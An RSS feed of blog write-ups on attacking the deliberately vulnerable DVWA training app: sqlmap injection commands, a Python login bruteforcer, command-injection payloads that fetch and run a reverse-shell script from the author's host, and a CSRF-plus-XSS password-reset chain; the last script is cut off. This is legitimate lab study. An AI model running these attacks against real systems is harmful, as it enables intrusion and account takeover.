<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-03-27T10:41:21+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Blind SQL Injection- DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html" rel="alternate" type="text/html" title="Blind SQL Injection- DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html"><![CDATA[<p>This is an exercise in OWASP DVWA for exploiting blind SQL injection.</p>

<p><br /></p>

<h3 id="blind-sql-injection---dvwa">Blind SQL Injection - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we are given a simple form that checks if a user exists with the given ID;</p>

<p><img src="/assets/img/20220327082816.png" alt="" /></p>

<p>When given an invalid user ID, the application respond with this;</p>

<p><img src="/assets/img/20220327083013.png" alt="" /></p>

<p>The application appears to be vulnerable to <em>blind SQL injection</em> because injecting an SQL query that will always evaluate to true gave a positive output;</p>

<p><img src="/assets/img/20220327083207.png" alt="" /></p>

<p>Blind injections are a pain to exploit manually, so I called in <code class="language-plaintext highlighter-rouge">sqlmap</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit'</span> <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--cookie</span> <span class="s1">'security=low; PHPSESSID=5c8siun1tr567gd519v1mivcbi'</span> <span class="nt">--dbs</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220327083557.png" alt="" /></p>

<p>Tables in <code class="language-plaintext highlighter-rouge">dvwa</code> database;</p>

<p><img src="/assets/img/20220327083621.png" alt="" /></p>

<p>Contents of <code class="language-plaintext highlighter-rouge">users</code> table;</p>

<p><img src="/assets/img/20220327083912.png" alt="" /></p>

<p>Blind SQL injections can be pretty slow, even with <code class="language-plaintext highlighter-rouge">sqlmap</code>. You can speed up the process by increasing the number of threads using the <code class="language-plaintext highlighter-rouge">--threads</code> argument, but this could easily corrupt the data being dumped when <code class="language-plaintext highlighter-rouge">sqlmap</code> is using a <em>time delay</em> technique in an unstable connection.</p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, we get a different form where the inputs are predefined in the form;</p>

<p><img src="/assets/img/20220327084414.png" alt="" /></p>

<p>The challenges are looking similar to the ones in error-based SQL injection section. Using a proxy and injecting an SQL query that always evaluate to true gives a positive result, indicating the application is vulnerable;</p>

<p><img src="/assets/img/20220327084936.png" alt="" /></p>

<p><img src="/assets/img/20220327085000.png" alt="" /></p>

<p>This is exploitable using <code class="language-plaintext highlighter-rouge">sqlmap</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/sqli_blind/'</span> <span class="nt">--data</span> <span class="s1">'id=1&amp;Submit=Submit'</span> <span class="nt">--cookie</span> <span class="s1">'security=medium; PHPSESSID=5c8siun1tr567gd519v1mivcbi'</span> <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--dbs</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220327085253.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>This mode is also similar to the <em>high difficulty</em> level of the error-based SQL injection challenge. Only difference is this one is blind;</p>

<p><img src="/assets/img/20220327085544.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="sql injection" /><category term="sqlmap" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for exploiting blind SQL injection.]]></summary></entry><entry><title type="html">Bruteforce - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce.html" rel="alternate" type="text/html" title="Bruteforce - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce.html"><![CDATA[<p>This is an exercise in OWASP DVWA on login bruteforcing.</p>

<p><br /></p>

<h3 id="bruteforce---dvwa">Bruteforce - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we were presented with a login form;</p>

<p><img src="/assets/img/20220323102403.png" alt="" /></p>

<p>The form is submitted in a GET request with not CSRF tokens;</p>

<p><img src="/assets/img/20220323102539.png" alt="" /></p>

<p>This was a piece of cake to bruteforce using <code class="language-plaintext highlighter-rouge">ffuf</code>. All we had to do is get our session cookie for the application since the form is only accessible by logged in users, and filter out the login error message, which is <code class="language-plaintext highlighter-rouge">Username and/or password incorrect</code>;</p>

<p><img src="/assets/img/20220323102823.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>We get the same login form, and it’s also submitted in a POST request. The only difference I can see is the delay in response by the server. This will slow down bruteforce attacks. Using <code class="language-plaintext highlighter-rouge">ffuf</code> to bruteforce the login showed some errors, and eventually the whole application appears to hang, even when requesting other pages. However, this delay appears to be tied only to the session cookie I’m using to do the bruteforce because no such delay was observed in another session.</p>

<p><img src="/assets/img/20220323110648.png" alt="" /></p>

<p>The bruteforce succeded after forcing <code class="language-plaintext highlighter-rouge">ffuf</code> to only use a single thread, which is slow;</p>

<p><img src="/assets/img/20220323111121.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>In this mode, we get a similar login form again, but with a CSRF token;</p>

<p><img src="/assets/img/20220323111507.png" alt="" /></p>

<p>Altering the CSRF token showed that it’s being validated by the web application;</p>

<p><img src="/assets/img/20220323111729.png" alt="" /></p>

<table>
  <tbody>
    <tr>
      <td>This means we need to account for this during our bruteforce. Earlier, we [[Initial Access#Making a Bruteforcer</td>
      <td>made something similar]] for bruteforcing the main login page of DVWA.</td>
    </tr>
  </tbody>
</table>

<p>This time, we are going to do something similar, but a little bit more advance. We will make the program multi-threaded.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#------------------------------------------------------------------
# A bruteforcer for DVWA's bruteforce challenge 3 (high difficulty)
#                                 Author: https://4g3nt47.github.io
#------------------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="nn">queue</span> <span class="kn">import</span> <span class="n">Queue</span>

<span class="k">class</span> <span class="nc">l3_bruteforcer</span><span class="p">:</span>

  <span class="c1"># The class initializer.
</span>  <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">wordlist</span><span class="p">,</span> <span class="n">threads</span><span class="p">):</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">messages</span> <span class="o">=</span> <span class="n">Queue</span><span class="p">()</span> <span class="c1"># Used to queue outputs by threads.
</span>    <span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
    <span class="c1"># Parse the cookie string (e.g "user=someUser; priv=somePriv"), there is probably a better way to do this :)
</span>    <span class="n">data</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"; "</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">cookies</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
      <span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()]</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">wordlist</span> <span class="o">=</span> <span class="n">wordlist</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">threads</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="k">if</span> <span class="n">threads</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="n">threads</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">=</span> <span class="bp">False</span>

  <span class="c1"># Called when starting the bruteforce. Dispatches all threads.
</span>  <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="c1"># Load the wordlist into a Queue object
</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Loading wordlist..."</span><span class="p">);</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">words</span> <span class="o">=</span> <span class="n">Queue</span><span class="p">()</span>
    <span class="n">rfo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wordlist</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
      <span class="n">line</span> <span class="o">=</span> <span class="n">rfo</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span> <span class="k">break</span> <span class="c1"># List exhausted
</span>      <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="c1"># Start the threads.
</span>    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Starting </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">threads</span><span class="si">}</span><span class="s"> threads..."</span><span class="p">);</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">threads</span><span class="p">):</span>
      <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">brute</span><span class="p">)</span>
      <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="c1"># Loop and print logs.
</span>    <span class="k">while</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">==</span> <span class="bp">False</span> <span class="ow">and</span> <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
      <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
      <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="k">print</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">get</span><span class="p">())</span>

  <span class="c1"># The thread function.
</span>  <span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">abort</span><span class="p">:</span>
      <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="k">break</span>
      <span class="n">password</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
      <span class="c1"># Fetch the token.
</span>      <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
      <span class="n">body</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="c1"># No need for regular expressions when you can just split and index your way to glory!!!
</span>      <span class="n">token</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"name='user_token' value='"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"'"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
      <span class="c1"># Attempt to login
</span>      <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Trying </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="n">body</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"?username=</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;password=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">&amp;user_token=</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">&amp;Login=Login"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="s">"Username and/or password incorrect"</span> <span class="ow">in</span> <span class="n">body</span><span class="p">:</span> <span class="c1"># Login successful???
</span>        <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Authentiation successful: </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">=</span> <span class="bp">True</span> <span class="c1"># Signals other threads to quit.
</span>        <span class="k">break</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;url&gt; &lt;cookie&gt; &lt;username&gt; &lt;wordlist&gt; &lt;threads&gt;"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="n">bruteforcer</span> <span class="o">=</span> <span class="n">l3_bruteforcer</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">]))</span>
  <span class="n">bruteforcer</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Testing this with number of threads set to <code class="language-plaintext highlighter-rouge">1</code> worked;</p>

<p><img src="/assets/img/20220323121335.png" alt="" /></p>

<p>Setting the value of threads to more than <code class="language-plaintext highlighter-rouge">1</code> however, gave a false positive;</p>

<p><img src="/assets/img/20220323121547.png" alt="" /></p>

<p>Running the requests through a proxy, the threading appears to be messing up the CSRF token validation;</p>

<p><img src="/assets/img/20220323121801.png" alt="" /></p>

<p>This is likely because the token is tied to the session of a user, so by the time a token is issued for a request in one thread, other tokens issued to other threads will be invalidated. This makes the multi-threading feature added to the code completely useless :(</p>

<p><img src="/assets/img/20220327093554.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="ffuf" /><category term="bruteforce" /><category term="python" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA on login bruteforcing.]]></summary></entry><entry><title type="html">Command Injection - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection.html" rel="alternate" type="text/html" title="Command Injection - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection.html"><![CDATA[<p>This is an exercise in OWASP DVWA for <em>command injection</em>.</p>

<p><br /></p>

<h3 id="command-injection---dvwa">Command Injection - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>This mode gave us an input field for an IP address. Following submission, and a short delay, some output that look to be the result of the <code class="language-plaintext highlighter-rouge">ping</code> command was displayed;</p>

<p><img src="/assets/img/20220323175128.png" alt="" /></p>

<p>The user input is submitted in a POST request;</p>

<p><img src="/assets/img/20220323175239.png" alt="" /></p>

<p>Since we do know our instance of DVWA is running on a linux host, we were able to inject code into the command by using a semi colon, which act as a command separator;</p>

<p><img src="/assets/img/20220323175709.png" alt="" /></p>

<p>I was able to spawn a shell on the box using a base64-encoded bash reverse shell;</p>

<p><img src="/assets/img/20220323180023.png" alt="" /></p>

<p><img src="/assets/img/20220323180043.png" alt="" /></p>

<p><img src="/assets/img/20220323180124.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, we are presented with the same form again;</p>

<p><img src="/assets/img/20220323180426.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">;</code> to inject commands simply hung the application for few secods, before returning blank result. Testing for other methods of command injection, we were able to inject code using a double pipe (<code class="language-plaintext highlighter-rouge">||</code>), which is used to execute a command if the previous command in the chain has failed;</p>

<p><img src="/assets/img/20220323180953.png" alt="" /></p>

<p>This injection can also be used to spawn a shell on the box;</p>

<p><img src="/assets/img/20220323181229.png" alt="" /></p>

<p><img src="/assets/img/20220323181249.png" alt="" /></p>

<p>Command injection using conditional operators like <code class="language-plaintext highlighter-rouge">||</code> is not ideal because they depend on the exit code of the primary command you are injecting into.  So I tried wrapping the injected command in backticks, which will take precedence over the primary command because it’s output will be used to construct the primary command, and it worked;</p>

<p><img src="/assets/img/20220323181652.png" alt="" /></p>

<p><img src="/assets/img/20220323181711.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>We got the same form again in this mode;</p>

<p><img src="/assets/img/20220323181932.png" alt="" /></p>

<p>Command injection using <code class="language-plaintext highlighter-rouge">||</code> works;</p>

<p><img src="/assets/img/20220323182443.png" alt="" /></p>

<p>However, injecting any command that has a whitespace appears to fail;</p>

<p><img src="/assets/img/20220323182510.png" alt="" /></p>

<p>This indicate there may be a filter that blocks input that contain whitespaces. Since we know it’s a linux host, we may be able to bypass this using the <em>internal field separator</em> (IFS) environment variable, which is <code class="language-plaintext highlighter-rouge">$IFS</code>. In my bash shell, this is set to a newline character <code class="language-plaintext highlighter-rouge">0x0a</code>;</p>

<p><img src="/assets/img/20220323182828.png" alt="" /></p>

<p>To my surprise, using the <code class="language-plaintext highlighter-rouge">$IFS</code> variable to bypass the filter didn’t work. However, while the command <code class="language-plaintext highlighter-rouge">ls -al</code> failed, the command <code class="language-plaintext highlighter-rouge">ls /</code> actually succeeded, which indicate whitespace is likely not what the filter is targetting. The only difference I can see between these two commands is the hyphen character (<code class="language-plaintext highlighter-rouge">-</code>).</p>

<p>If the application is indeed blocking the user of <code class="language-plaintext highlighter-rouge">-</code>, I can no longer use my base64-encoded reverse shell because I need to decode it using <code class="language-plaintext highlighter-rouge">base64 -d</code>. Checking the box for tools we can take advantage of, <code class="language-plaintext highlighter-rouge">wget</code> was found;</p>

<p><img src="/assets/img/20220323210702.png" alt="" /></p>

<p>I can download a file to current directory with<code class="language-plaintext highlighter-rouge">wget</code> without using any <code class="language-plaintext highlighter-rouge">-</code> character. So created a bash script on my box containing my reverse shell payload, and host it using python’s web server;</p>

<p><img src="/assets/img/20220323210841.png" alt="" /></p>

<p>Using the payload <code class="language-plaintext highlighter-rouge">|| wget http://172.17.0.1/shell.sh</code>, I was able to download it to the box. I then made it executable with <code class="language-plaintext highlighter-rouge">|| chmod +x shell.sh</code>, and ran it using <code class="language-plaintext highlighter-rouge">|| ./shell.sh</code>. This gave me a shell on the box;</p>

<p><img src="/assets/img/20220323211103.png" alt="" /></p>

<p><img src="/assets/img/20220323211202.png" alt="" /></p>

<p><img src="/assets/img/20220323211249.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="command injection" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for command injection.]]></summary></entry><entry><title type="html">CSRF + Stored XSS - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_csrf_plus_xss.html" rel="alternate" type="text/html" title="CSRF + Stored XSS - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_csrf_plus_xss</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_csrf_plus_xss.html"><![CDATA[<p>This is an exercise in OWASP DVWA where I chained Stored XSS with CSRF.</p>

<p><br /></p>

<h3 id="csrf-and-stored-xss---dvwa">CSRF and Stored XSS - DVWA</h3>
<p><br /></p>

<p>For this challenge, we will be chaining the CSRF vulnerability with stored XSS vulnerability since there is no other way to make another user in the application interact with our payload. We will be using the account of <strong>smithy</strong>, whose password is <code class="language-plaintext highlighter-rouge">password</code>, to target the user <strong>admin</strong>, which I am logged into in a private window.</p>

<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>For this mode, we are presented with a simple password reset form;</p>

<p><img src="/assets/img/20220324074556.png" alt="" /></p>

<p>Note that the form does not ask users to input their current passwords, and no CSRF token is used. The data is also submitted in a GET request, which will make it more convenient to exploit;</p>

<p><img src="/assets/img/20220324074734.png" alt="" /></p>

<p><img src="/assets/img/20220324074750.png" alt="" /></p>

<p>As the user <em>smithy</em>, I added a stored XSS payload that will reset the password of any user that visit the page to <code class="language-plaintext highlighter-rouge">hacked</code>;</p>

<p><img src="/assets/img/20220324075501.png" alt="" /></p>

<p>Going to the page as the user <strong>admin</strong>, we got some broken image thumbnail;</p>

<p><img src="/assets/img/20220324075616.png" alt="" /></p>

<p>So I tried to login using <code class="language-plaintext highlighter-rouge">admin:hacked</code>, and it worked!</p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>Again, we were presented with the same form with no CSRF tokens or requirement to input current password. Attempt to exploit stored XSS in the <code class="language-plaintext highlighter-rouge">txtName</code> gave an error;</p>

<p><img src="/assets/img/20220324080456.png" alt="" /></p>

<p>Doing it in the <code class="language-plaintext highlighter-rouge">mtxMessage</code> field blanked out the body;</p>

<p><img src="/assets/img/20220324080753.png" alt="" /></p>

<p>Since the <code class="language-plaintext highlighter-rouge">txtName</code> field is only complaining about the length of the input, we could exploit this by setting up a short URL that redirect to our target URL. So I built a simple python program that can handle the redirect;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-------------------------------------------------------
# A simple script for setting up a static HTTP redirect.
#                      Author: https://4g3nt47.github.io
#-------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">threading</span>

<span class="c1"># Called in a separate thread. Handles the redirection.
</span><span class="k">def</span> <span class="nf">redirect</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">target_url</span><span class="p">):</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">9999</span><span class="p">)</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">"HTTP/1.1 302 Found</span><span class="se">\r\n</span><span class="s">Server: Apache/2.4.38</span><span class="se">\r\n</span><span class="s">Content-Length: 0</span><span class="se">\r\n</span><span class="s">Location: </span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="se">\n\r\n\r\n</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># Our main function.
</span><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">,</span> <span class="n">target_url</span><span class="p">):</span>
  <span class="c1"># Create the socket server.
</span>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
  <span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Listening...."</span><span class="p">)</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
      <span class="c1"># Spawn a thread for the client.
</span>      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Redirecting </span><span class="si">{</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s">..."</span><span class="p">)</span>
      <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">redirect</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">target_url</span><span class="p">))</span>
      <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
      <span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
      <span class="k">break</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
